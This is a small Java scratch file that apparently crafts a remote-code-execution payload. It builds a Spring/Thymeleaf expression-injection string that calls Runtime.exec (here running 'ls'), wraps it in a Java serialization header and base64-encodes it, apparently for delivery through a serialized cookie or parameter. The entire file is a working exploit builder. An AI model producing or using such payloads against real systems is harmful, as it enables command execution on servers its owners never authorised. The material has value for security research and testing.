package com.sec.cwm;

import java.util.Arrays;
import java.util.Base64;

public class test {
    public static void main(String args[]){
        System.out.println(Arrays.toString(Base64.getDecoder().decode("rO0ABXQABWd1ZXN0")));
        String a="__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"ls\").getInputStream()).next()}__::.x";
        System.out.println(Arrays.toString(a.getBytes()));
        byte[] test=new byte[]{-84, -19, 0, 5, 116, 0, 102,95, 95, 36, 123, 110, 101, 119, 32, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 83, 99, 97, 110, 110, 101, 114, 40, 84, 40, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 41, 46, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 108, 115, 34, 41, 46, 103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 40, 41, 41, 46, 110, 101, 120, 116, 40, 41, 125, 95, 95, 58, 58, 46, 120};
        System.out.println(Base64.getEncoder().encodeToString(test));
        System.out.println("__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"ls\").getInputStream()).next()}__::.x".length());
        System.out.println(Base64.getEncoder().encodeToString("__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"ls\").getInputStream()).next()}__::.x".getBytes()));
    }
}
